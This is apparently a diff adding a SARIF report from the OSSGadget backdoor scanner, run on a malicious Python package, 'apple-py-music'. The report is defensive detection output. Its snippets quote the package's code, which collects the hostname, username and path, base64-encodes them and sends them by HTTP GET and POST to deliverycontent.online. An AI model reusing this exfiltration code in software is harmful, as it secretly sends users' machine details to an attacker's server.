@@ -1,0 +1,387 @@
+{
+  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "oss-detect-backdoor",
+          "organization": "Microsoft Corporation",
+          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
+          "version": "0.1.428+ed0e2cfe6a"
+        }
+      },
+      "results": [
+        {
+          "rule": {
+            "id": "BD000800"
+          },
+          "message": {
+            "text": "Backdoor: Obfuscation",
+            "id": "BD000800"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/apple-py-music-1.0.tar.gz/apple-py-music-1.0.tar/apple-py-music-1.0/apple_py_music/__init__.py"
+                },
+                "region": {
+                  "startLine": 34,
+                  "startColumn": 10,
+                  "endLine": 34,
+                  "endColumn": 16,
+                  "snippet": {
+                    "text": "    pass\n\ndata = \"%s;%s;%s;%s\" % (hostname, username, package, execution_path)\nb64data = base64.b64encode(data.encode()).decode()\n\ndata_part_length = 29\nparts_count = len(b64data) // data_part_length\n",
+                    "rendered": {
+                      "text": "    pass\n\ndata = \"%s;%s;%s;%s\" % (hostname, username, package, execution_path)\nb64data = base64.b64encode(data.encode()).decode()\n\ndata_part_length = 29\nparts_count = len(b64data) // data_part_length\n",
+                      "markdown": "`    pass\n\ndata = \"%s;%s;%s;%s\" % (hostname, username, package, execution_path)\nb64data = base64.b64encode(data.encode()).decode()\n\ndata_part_length = 29\nparts_count = len(b64data) // data_part_length\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000800"
+          },
+          "message": {
+            "text": "Backdoor: Obfuscation",
+            "id": "BD000800"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/apple-py-music-1.0.tar.gz/apple-py-music-1.0.tar/apple-py-music-1.0/apple_py_music/__init__.py"
+                },
+                "region": {
+                  "startLine": 3,
+                  "startColumn": 7,
+                  "endLine": 3,
+                  "endColumn": 13,
+                  "snippet": {
+                    "text": "package = \"apple-py-music_1.0\"\nimport os\nimport base64\nimport random\n\ndns_domain = \".sub.deliverycontent.online\"\n",
+                    "rendered": {
+                      "text": "package = \"apple-py-music_1.0\"\nimport os\nimport base64\nimport random\n\ndns_domain = \".sub.deliverycontent.online\"\n",
+                      "markdown": "`package = \"apple-py-music_1.0\"\nimport os\nimport base64\nimport random\n\ndns_domain = \".sub.deliverycontent.online\"\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/apple-py-music-1.0.tar.gz/apple-py-music-1.0.tar/apple-py-music-1.0/apple_py_music/__init__.py"
+                },
+                "region": {
+                  "startLine": 91,
+                  "startColumn": 16,
+                  "endLine": 91,
+                  "endColumn": 21,
+                  "snippet": {
+                    "text": "\ntry:\n    import requests\n    r = requests.get(\"http://%s/g?d=%s\" % (http_domain, data_get), timeout=10)\nexcept Exception:\n    pass\n\n",
+                    "rendered": {
+                      "text": "\ntry:\n    import requests\n    r = requests.get(\"http://%s/g?d=%s\" % (http_domain, data_get), timeout=10)\nexcept Exception:\n    pass\n\n",
+                      "markdown": "`\ntry:\n    import requests\n    r = requests.get(\"http://%s/g?d=%s\" % (http_domain, data_get), timeout=10)\nexcept Exception:\n    pass\n\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/apple-py-music-1.0.tar.gz/apple-py-music-1.0.tar/apple-py-music-1.0/apple_py_music/__init__.py"
+                },
+                "region": {
+                  "startLine": 85,
+                  "startColumn": 16,
+                  "endLine": 85,
+                  "endColumn": 22,
+                  "snippet": {
+                    "text": "\ntry:\n    import requests\n    r = requests.post(\"http://%s/p\" % http_domain, data=data_post, timeout=10)\nexcept Exception:\n    pass\n\n",
+                    "rendered": {
+                      "text": "\ntry:\n    import requests\n    r = requests.post(\"http://%s/p\" % http_domain, data=data_post, timeout=10)\nexcept Exception:\n    pass\n\n",
+                      "markdown": "`\ntry:\n    import requests\n    r = requests.post(\"http://%s/p\" % http_domain, data=data_post, timeout=10)\nexcept Exception:\n    pass\n\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/apple-py-music-1.0.tar.gz/apple-py-music-1.0.tar/apple-py-music-1.0/apple_py_music/__init__.py"
+                },
+                "region": {
+                  "startLine": 33,
+                  "startColumn": 24,
+                  "endLine": 33,
+                  "endColumn": 32,
+                  "snippet": {
+                    "text": "except Exception:\n    pass\n\ndata = \"%s;%s;%s;%s\" % (hostname, username, package, execution_path)\nb64data = base64.b64encode(data.encode()).decode()\n\ndata_part_length = 29\n",
+                    "rendered": {
+                      "text": "except Exception:\n    pass\n\ndata = \"%s;%s;%s;%s\" % (hostname, username, package, execution_path)\nb64data = base64.b64encode(data.encode()).decode()\n\ndata_part_length = 29\n",
+                      "markdown": "`except Exception:\n    pass\n\ndata = \"%s;%s;%s;%s\" % (hostname, username, package, execution_path)\nb64data = base64.b64encode(data.encode()).decode()\n\ndata_part_length = 29\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/apple-py-music-1.0.tar.gz/apple-py-music-1.0.tar/apple-py-music-1.0/apple_py_music/__init__.py"
+                },
+                "region": {
+                  "startLine": 16,
+                  "startColumn": 8,
+                  "endLine": 16,
+                  "endColumn": 16,
+                  "snippet": {
+                    "text": "    pass\nif hostname == \"\":\n    try:\n        hostname = os.environ['COMPUTERNAME']\n    except Exception:\n        pass\n\n",
+                    "rendered": {
+                      "text": "    pass\nif hostname == \"\":\n    try:\n        hostname = os.environ['COMPUTERNAME']\n    except Exception:\n        pass\n\n",
+                      "markdown": "`    pass\nif hostname == \"\":\n    try:\n        hostname = os.environ['COMPUTERNAME']\n    except Exception:\n        pass\n\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/apple-py-music-1.0.tar.gz/apple-py-music-1.0.tar/apple-py-music-1.0/apple_py_music/__init__.py"
+                },
+                "region": {
+                  "startLine": 14,
+                  "startColumn": 3,
+                  "endLine": 14,
+                  "endColumn": 11,
+                  "snippet": {
+                    "text": "    hostname = os.uname().nodename\nexcept Exception:\n    pass\nif hostname == \"\":\n    try:\n        hostname = os.environ['COMPUTERNAME']\n    except Exception:\n",
+                    "rendered": {
+                      "text": "    hostname = os.uname().nodename\nexcept Exception:\n    pass\nif hostname == \"\":\n    try:\n        hostname = os.environ['COMPUTERNAME']\n    except Exception:\n",
+                      "markdown": "`    hostname = os.uname().nodename\nexcept Exception:\n    pass\nif hostname == \"\":\n    try:\n        hostname = os.environ['COMPUTERNAME']\n    except Exception:\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/apple-py-music-1.0.tar.gz/apple-py-music-1.0.tar/apple-py-music-1.0/apple_py_music/__init__.py"
+                },
+                "region": {
+                  "startLine": 11,
+                  "startColumn": 4,
+                  "endLine": 11,
+                  "endColumn": 12,
+                  "snippet": {
+                    "text": "\nhostname = \"\"\ntry:\n    hostname = os.uname().nodename\nexcept Exception:\n    pass\nif hostname == \"\":\n",
+                    "rendered": {
+                      "text": "\nhostname = \"\"\ntry:\n    hostname = os.uname().nodename\nexcept Exception:\n    pass\nif hostname == \"\":\n",
+                      "markdown": "`\nhostname = \"\"\ntry:\n    hostname = os.uname().nodename\nexcept Exception:\n    pass\nif hostname == \"\":\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/apple-py-music-1.0.tar.gz/apple-py-music-1.0.tar/apple-py-music-1.0/apple_py_music/__init__.py"
+                },
+                "region": {
+                  "startLine": 9,
+                  "endLine": 9,
+                  "endColumn": 8,
+                  "snippet": {
+                    "text": "dns_domain = \".sub.deliverycontent.online\"\nhttp_domain = \"www.deliverycontent.online\"\n\nhostname = \"\"\ntry:\n    hostname = os.uname().nodename\nexcept Exception:\n",
+                    "rendered": {
+                      "text": "dns_domain = \".sub.deliverycontent.online\"\nhttp_domain = \"www.deliverycontent.online\"\n\nhostname = \"\"\ntry:\n    hostname = os.uname().nodename\nexcept Exception:\n",
+                      "markdown": "`dns_domain = \".sub.deliverycontent.online\"\nhttp_domain = \"www.deliverycontent.online\"\n\nhostname = \"\"\ntry:\n    hostname = os.uname().nodename\nexcept Exception:\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000610"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Linux Indicator",
+            "id": "BD000610"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/apple-py-music-1.0.tar.gz/apple-py-music-1.0.tar/apple-py-music-1.0/apple_py_music/__init__.py"
+                },
+                "region": {
+                  "startLine": 3,
+                  "startColumn": 6,
+                  "endLine": 4,
+                  "snippet": {
+                    "text": "package = \"apple-py-music_1.0\"\nimport os\nimport base64\nimport random\n\ndns_domain = \".sub.deliverycontent.online\"\nhttp_domain = \"www.deliverycontent.online\"\n",
+                    "rendered": {
+                      "text": "package = \"apple-py-music_1.0\"\nimport os\nimport base64\nimport random\n\ndns_domain = \".sub.deliverycontent.online\"\nhttp_domain = \"www.deliverycontent.online\"\n",
+                      "markdown": "`package = \"apple-py-music_1.0\"\nimport os\nimport base64\nimport random\n\ndns_domain = \".sub.deliverycontent.online\"\nhttp_domain = \"www.deliverycontent.online\"\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        }
+      ],
+      "columnKind": "utf16CodeUnits"
+    }
+  ]
+}
